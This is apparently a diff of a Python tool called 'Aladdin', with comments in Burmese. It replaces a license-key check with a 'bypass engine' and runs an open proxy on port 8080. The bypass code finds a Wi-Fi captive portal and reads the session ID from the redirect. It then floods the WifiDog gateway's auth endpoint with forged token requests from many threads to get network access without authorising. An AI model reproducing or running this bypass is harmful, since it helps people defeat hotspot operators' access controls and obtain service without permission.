@@ -2,110 +2,119 @@ import os
 import socket
 import threading
 import requests
-import urllib3
-from colorama import Fore, Back, Style, init
+import time
+from urllib.parse import urlparse, parse_qs
 
-# SSL Warning ပိတ်ရန်နှင့် Colorama စတင်ရန်
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-init(autoreset=True)
-
-# ===============================
-# CONFIGURATION
-# ===============================
-GITHUB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
-USER_KEY = "AF8BE771-03B" 
+# --- CONFIGURATION ---
 PROXY_PORT = 8080
+PING_THREADS = 10  # Bypass လုပ်မယ့် အရှိန်
+
+# Colors
+G = "\033[92m"
+Y = "\033[93m"
+C = "\033[96m"
+W = "\033[0m"
 
 def h_banner():
     os.system('clear')
-    print(f"{Fore.MAGENTA}{'='*55}")
-    print(f"{Fore.CYAN}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
-    print(f"{Fore.CYAN} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
-    print(f"{Fore.CYAN} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
-    print(f"{Fore.CYAN} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
-    print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
-    print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚════╝")
-    print(f"{Fore.MAGENTA}{'='*55}")
-    print(f"{Fore.WHITE}{Back.BLUE}      ALADDIN HTTPS BYPASS | OWNER: MOE YU      ")
-    print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")
+    print(f"{C}{'='*55}")
+    print(f"{G}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗")
+    print(f"{G} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗")
+    print(f"{G} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗")
+    print(f"{G} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗")
+    print(f"{G} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚███╗")
+    print(f"{C}{'='*55}")
+    print(f"{W}      ALADDIN ALL-IN-ONE | OWNER: MOE YU")
+    print(f"{C}{'='*55}\n")
 
 # ===============================
-# HTTPS PROXY ENGINE (For Wi-Fi Settings)
+# ၁။ PROXY ENGINE (HTTPS Support)
 # ===============================
+def bridge(src, dest):
+    try:
+        while True:
+            data = src.recv(8192)
+            if not data: break
+            dest.sendall(data)
+    except: pass
+    finally:
+        try: src.close()
+        except: pass
+        try: dest.close()
+        except: pass
+
 def handle_client(client_socket):
     try:
-        # Request ကို လက်ခံခြင်း
         request = client_socket.recv(4096).decode('latin-1')
         if not request: return
         
         first_line = request.split('\n')[0]
         method = first_line.split(' ')[0]
-        
-        # HTTPS လမ်းကြောင်းများကို တိုက်ရိုက်ချိတ်ပေးခြင်း
-        if method == "CONNECT":
-            host_port = first_line.split(' ')[1]
-            host, port = host_port.split(':')
-            
-            # Target Server သို့ ချိတ်ဆက်ခြင်း
-            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            remote_socket.connect((host, int(port)))
-            client_socket.send(b"HTTP/1.1 200 Connection Established\r\n\r\n")
-            
-            # Data Bridge လုပ်ခြင်း
-            def bridge(src, dest):
-                try:
-                    while True:
-                        data = src.recv(4096)
-                        if not data: break
-                        dest.sendall(data)
-                except: pass
 
+        if method == "CONNECT":
+            target = first_line.split(' ')[1]
+            host, port = target.split(':')
+            remote_socket = socket.create_connection((host, int(port)))
+            client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+            
             threading.Thread(target=bridge, args=(client_socket, remote_socket), daemon=True).start()
             bridge(remote_socket, client_socket)
         else:
-            # ရိုးရိုး HTTP Requests များအတွက်
-            client_socket.send(b"HTTP/1.1 501 Unsupported Method\r\n\r\n")
+            client_socket.sendall(b"HTTP/1.1 501 Unsupported Method\r\n\r\n")
     except: pass
     finally: client_socket.close()
 
-def start_engine():
-    try:
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(('0.0.0.0', PROXY_PORT))
-        server.listen(10)
-        print(f"{Fore.GREEN}[✔] Aladdin Engine is Live on Port: {PROXY_PORT}")
-        print(f"{Fore.YELLOW}[i] Wi-Fi Proxy: 127.0.0.1 | Port: {PROXY_PORT}")
-        
-        while True:
-            client, addr = server.accept()
-            # print(f"{Fore.BLACK}{Back.WHITE} [LOG] Connection from: {addr[0]} ") # Log ကြည့်ချင်လျှင် ဖွင့်ပါ
-            threading.Thread(target=handle_client, args=(client,), daemon=True).start()
-    except Exception as e:
-        print(f"{Fore.RED}[!] Server Error: {e}")
+def start_proxy():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(('0.0.0.0', PROXY_PORT))
+    server.listen(100)
+    print(f"{G}[✔] Proxy Engine Live on Port: {PROXY_PORT}")
+    while True:
+        client, addr = server.accept()
+        threading.Thread(target=handle_client, args=(client,), daemon=True).start()
 
 # ===============================
-# LICENSE VERIFICATION
+# ၂။ BYPASS ENGINE (No Key)
 # ===============================
-def verify_license():
-    h_banner()
-    print(f"{Fore.YELLOW}[i] Validating Access...")
+def check_internet():
     try:
-        response = requests.get(GITHUB_URL, timeout=15, verify=False)
-        if response.status_code == 200:
-            raw_text = response.text.strip()
-            if "|" in raw_text:
-                key_from_server, exp_date_str = raw_text.split("|")
-                if key_from_server.strip() == USER_KEY:
-                    print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
-                    print(f"{Fore.WHITE}└─ Security Date: {Fore.YELLOW}{exp_date_str.strip()}")
-                    return True
-        return False
-    except:
-        return False
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except: return False
 
+def bypass_engine():
+    print(f"{Y}[i] Scanning for Wi-Fi Portal...")
+    while True:
+        try:
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            if r.status_code == 204 and check_internet():
+                time.sleep(10)
+                continue
+
+            portal_url = r.url
+            parsed = urlparse(portal_url)
+            sid = parse_qs(parsed.query).get('sessionId', [None])[0]
+
+            if sid:
+                print(f"{G}[✔] Portal Found! SID: {sid}")
+                gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
+                gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
+
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=lambda: [requests.get(auth_link) for _ in range(50)], daemon=True).start()
+                print(f"{C}[*] Turbo Bypass Active!")
+            
+            time.sleep(5)
+        except: time.sleep(5)
+
+# ===============================
+# ၃။ MAIN EXECUTION
+# ===============================
 if __name__ == "__main__":
-    if verify_license():
-        start_engine()
-    else:
-        print(f"{Fore.RED}\n❌ ACCESS DENIED: INVALID KEY")
+    h_banner()
+    # Proxy ကို Background Thread ဖြင့် Run မည်
+    threading.Thread(target=start_proxy, daemon=True).start()
+    
+    # Bypass ကို Main Thread ဖြင့် Run မည်
+    bypass_engine()
